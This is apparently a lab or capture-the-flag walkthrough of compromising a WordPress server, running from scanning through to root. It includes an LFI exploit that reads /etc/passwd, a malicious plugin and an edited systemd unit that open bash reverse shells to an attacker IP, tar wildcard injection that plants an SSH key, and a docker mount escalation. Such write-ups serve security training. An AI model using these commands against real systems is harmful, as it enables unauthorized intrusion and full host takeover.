# Nmap scan
```bash
nmap -sC -sV -T4 -p- 192.168.1.120 -oN NmapScan.txt
```
> **-sC**: Script scan
> **-sV**: Version scan
> **-T4**: Run 4 threads
> **-p-**: Scan all ports
> **-oN**: Save output to file
- Result
```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-23 00:07 EEST
Nmap scan report for threats.int (192.168.1.120)
Host is up (0.0024s latency).
Not shown: 65532 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 be:a3:0c:9b:8b:6e:52:f6:25:15:4f:b1:cb:d8:d5:10 (RSA)
|   256 e2:0b:fd:4c:79:30:a6:33:d5:b9:2f:6a:42:28:ae:42 (ECDSA)
|_  256 6c:0a:a7:66:94:8e:37:36:48:d9:ba:32:23:67:6e:0c (ED25519)
80/tcp  open  http     Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Did not follow redirect to https://threats.int/
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 400 Bad Request
| ssl-cert: Subject: organizationName=Threats Intelligence, Inc/stateOrProvinceName=Amman/countryName=JO
| Not valid before: 2022-02-15T17:39:18
|_Not valid after:  2023-02-15T17:39:18
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.35 seconds
```
![Scan](https://i.imgur.com/7CnA4V6.png)
# Directory Bruteforce
```bash
feroxbuster -u https://threats.int/  -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt -k
```
- Result
```bash
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://threats.int/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200       97l      830w     7437c https://threats.int/readme.html
403        9l       28w      277c https://threats.int/.htaccess
301        0l        0w        0c https://threats.int/index.php
200      384l     3177w        0c https://threats.int/license.txt
200      102l      377w     6060c https://threats.int/wp-login.php
500        0l        0w        0c https://threats.int/wp-settings.php
200        3l        9w       73c https://threats.int/php.ini
403        9l       28w      277c https://threats.int/.html
403        9l       28w      277c https://threats.int/.php
403        9l       28w      277c https://threats.int/.htpasswd
403        9l       28w      277c https://threats.int/.htm
403        9l       28w      277c https://threats.int/.htpasswds
403        9l       28w      277c https://threats.int/.htgroup
403        9l       28w      277c https://threats.int/wp-forum.phps
403        9l       28w      277c https://threats.int/.htaccess.bak
403        9l       28w      277c https://threats.int/.htuser
[####################] - 1m     11424/11424   0s      found:16      errors:17
[####################] - 1m     11424/11424   108/s   https://threats.int/
```
![FeroxBuster](https://i.imgur.com/5iIVk0S.png)
After Seeing the  `wp-login.php` we can confirm that this website is running on wordpress.
Also after navigating to the footer of the webapp we can see that it's running on wordpress
![footer](https://i.imgur.com/hWSDkor.png)
# WPSCAN
```bash
wpscan --url https://threats.int/ -e ap --disable-tls-checks
```
- Result
```bash
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: https://threats.int/ [192.168.1.105]
[+] Started: Mon May 23 00:26:44 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://threats.int/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: https://threats.int/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://threats.int/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.9.3 identified (Latest, released on 2022-04-05).
 | Found By: Rss Generator (Passive Detection)
 |  - https://threats.int/?feed=rss2, <generator>https://wordpress.org/?v=5.9.3</generator>
 |  - https://threats.int/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.9.3</generator>

[+] WordPress theme in use: astra
 | Location: https://threats.int/wp-content/themes/astra/
 | Last Updated: 2022-05-16T00:00:00.000Z
 | Readme: https://threats.int/wp-content/themes/astra/readme.txt
 | [!] The version is out of date, the latest version is 3.8.1
 | Style URL: https://threats.int/wp-content/themes/astra/style.css
 | Style Name: Astra
 | Style URI: https://wpastra.com/
 | Description: Astra is fast, fully customizable & beautiful WordPress theme suitable for blog, personal portfolio,...
 | Author: Brainstorm Force
 | Author URI: https://wpastra.com/about/?utm_source=theme_preview&utm_medium=author_link&utm_campaign=astra_theme
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 3.7.7 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://threats.int/wp-content/themes/astra/style.css, Match: 'Version: 3.7.7'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] wp-with-spritz
 | Location: https://threats.int/wp-content/plugins/wp-with-spritz/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2015-08-20T20:15:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 4.2.4 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://threats.int/wp-content/plugins/wp-with-spritz/readme.txt

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon May 23 00:27:08 2022
[+] Requests Done: 32
[+] Cached Requests: 5
[+] Data Sent: 8.395 KB
[+] Data Received: 306.145 KB
[+] Memory used: 245.297 MB
[+] Elapsed time: 00:00:24
```

![wpscan](https://i.imgur.com/VfOnUAV.png)
Seems intersting as its last update is 7 years ago, let's check if it's vulnerable somehow
exploit link: https://www.exploit-db.com/exploits/44544
# Exploiting LFI to get admin access
```bash
curl 'https://threats.int/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../etc/passwd' -k
```
> **-k**: Disable tls check.

- Result
```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
vagrant:x:1000:1000:vagrant,,,:/home/vagrant:/bin/bash
mysql:x:111:118:MySQL Server,,,:/nonexistent:/bin/false
mohammad:x:1001:1004::/home/mohammad:/bin/bash
moayad:x:1002:1005::/home/moayad:/bin/bash
zeyad:x:1003:1006::/home/zeyad:/bin/bash
omar:x:1004:1007::/home/omar:/bin/bash
khaled:x:1005:1008::/home/khaled:/bin/bash
baker:x:1006:1009::/home/baker:/bin/bash
nabil:x:1007:1010::/home/nabil:/bin/bash
```
![LFI](https://i.imgur.com/NKzIKEI.png)
![WebLFI](https://i.imgur.com/fgkarkt.png)
## Reading wp-config.php
![](https://i.imgur.com/8JiKN7n.png)
# Logging as this user
![](https://i.imgur.com/uIWl3DI.png)
- Accessed the admin panel
![](https://i.imgur.com/eByIJUI.png)
- Created the vulnerable plugin 
```php
<?php
/**
* Plugin Name: Cute plugin
* Plugin URI:
* Description: Definitely not a malicious plugin (i think )
* Version: 1337.0
* Author: Zeyad Abulaban
* Author URI: https://hackers.org
*/
shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.104/9001 0>&1'")
?>
```
- Converted it into a zip archive
![](https://i.imgur.com/q4UL2Ml.png)
- Setting up ncat listener to catch revshell
![](https://i.imgur.com/jgA6xGK.png)
- Uploading plugin
Click on activate
![](https://i.imgur.com/TQu5lee.png)
- Catched revshell
![](https://i.imgur.com/W3CfrDi.png)

# From www-data to baker
Finding a cronjob running a script as baker
![[Pasted image 20220524232131.png]]
```bash
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
*  *  * * * baker /usr/bin/backup

```
Script contents:
![[Pasted image 20220524232324.png]]
```bash
#!/bin/bash

Source=/var/www/threats.int
Destination=/home/baker/backups/webapp.tgz

mkdir /home/baker/backups
cd $Source
tar -zcf $Destination *
```
we can see here that the script is using a  **star** wildcard to archieve the  `/var/www/threats.int` folder which isn't a good practice as we can exploit this to execute commands..
> Reference: https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/

so i created a bash script which will inject my public-ssh-key intp baker authorized_keys in order to login as him through ssh without a password
- malicious-script.sh
```bash
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8opR69nlCw4Fj7lmkwY/GwNi3lhdRmmJTndf7eUoBkfq0HrlJca1Nj5Ii/CkybIH4X4vke5mA+6F2vOsManmIIlkN3pu9mM9jyzz8inMze5wwM5kIk+YBntJOVJR9v1lPBmBjOIwLiCHWkBbfEr/5etG6POEE8ffpH0Sw5s8IgsWMy8P+5sanLw6sYfrOd8ibHUi6MK0SUQYtdUs9hdYg7h1D/4VB3a82W3qnnsknq+pSosvisnJ6EQPOmaEesd37D2mdAC8JQtVel/JJBkeRisbS/HLmggHtIkTD7nWGyYx3UXdqG+t0wMIWWE+HFqwGNIUTgCa8lIeJMpXfVpq6rwQdlnjeVDJdEZrWfwCjoDstL591JRIPiTXewI3vQGDRoQ0Gpncwo2TEwKWLoc7f0ZlzLINcKcxFXLRthEg+mk3M7wynw6MueSysxIrlDbPSemHsbzhkgek4P6AWtAe1YzES8k8OaqliaaujiAyz8F069VcFGat0aWTrpXtipm0= zeyad@AbuQasem' > /home/baker/.ssh/authorized_keys
```
- Creating files with option names
```bash
echo > "--checkpoint-action=exec=sh malicious-script.sh"
echo  > --checkpoint=1
```
after waiting 1 minute we can now login as baker with ssh without a password
- baker authorized_keys content
```txt
baker@BAU-Project:~$ cat .ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8opR69nlCw4Fj7lmkwY/GwNi3lhdRmmJTndf7eUoBkfq0HrlJca1Nj5Ii/CkybIH4X4vke5mA+6F2vOsManmIIlkN3pu9mM9jyzz8inMze5wwM5kIk+YBntJOVJR9v1lPBmBjOIwLiCHWkBbfEr/5etG6POEE8ffpH0Sw5s8IgsWMy8P+5sanLw6sYfrOd8ibHUi6MK0SUQYtdUs9hdYg7h1D/4VB3a82W3qnnsknq+pSosvisnJ6EQPOmaEesd37D2mdAC8JQtVel/JJBkeRisbS/HLmggHtIkTD7nWGyYx3UXdqG+t0wMIWWE+HFqwGNIUTgCa8lIeJMpXfVpq6rwQdlnjeVDJdEZrWfwCjoDstL591JRIPiTXewI3vQGDRoQ0Gpncwo2TEwKWLoc7f0ZlzLINcKcxFXLRthEg+mk3M7wynw6MueSysxIrlDbPSemHsbzhkgek4P6AWtAe1YzES8k8OaqliaaujiAyz8F069VcFGat0aWTrpXtipm0= zeyad@AbuQasem
```
![[Pasted image 20220524234027.png]]
# From baker to nabil
Running sudo -l shows us that baker can run a script as root without a password
![[Pasted image 20220524234157.png]]
- Script contents
![[Pasted image 20220524234241.png]]
```bash
#!/bin/bash


function PreventRoot
{
        if grep -Fxq "User=root" /etc/systemd/system/$1.service
        then
                echo "[!] Running service as root isn't allowed, this will be reported!"
                exit 1
        fi
}


if [[ -z $1 ]]
then
        echo "[!] Usage: $0 <Service-Name>"
        exit 1
else
        PreventRoot $1
        echo "[+] Restarting $1 service"
        /bin/systemctl daemon-reload
        /bin/systemctl restart $1
        echo "[+] Done"
fi

```
The script is used to reload and start systemd services.. let's view that folder contents `/etc/systemd/system/`
![[Pasted image 20220524234528.png]]
The most interesting one is the `debug.service` as we have a write permission on it because we are in the developers group
![[Pasted image 20220524234639.png]]

- debug.service contents
![[Pasted image 20220524234836.png]]
```bash
[Unit]
Description=Debugging purposes only

[Service]
Type=simple
User=foo # Change user
ExecStart=whoami #Script/Command to execute

[Install]
WantedBy=multi-user.target
```
we can execute commands and choose a user !
im going to change the file to execute a command to get me a reverse shell
![[Pasted image 20220524235301.png]]
```bash
[Unit]
Description=Debugging purposes only

[Service]
Type=simple
User=nabil
ExecStart=/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.1.104/9999 0>&1"

[Install]
WantedBy=multi-user.target
```
this should get me a shell as nabil
now let's get back to the `restart-services` to start this debug service and get  a shell.
# From nabil to root
listing sudo rights for nabil
![[Pasted image 20220525000507.png]]
Having the rights to run docker with sudo is dangerous as we can run a container with a mounted volume of the whole main os on that container
```bash
sudo /usr/bin/docker run --rm -it -v /:/MountedFS ubuntu bash
```
![[Pasted image 20220525001836.png]]
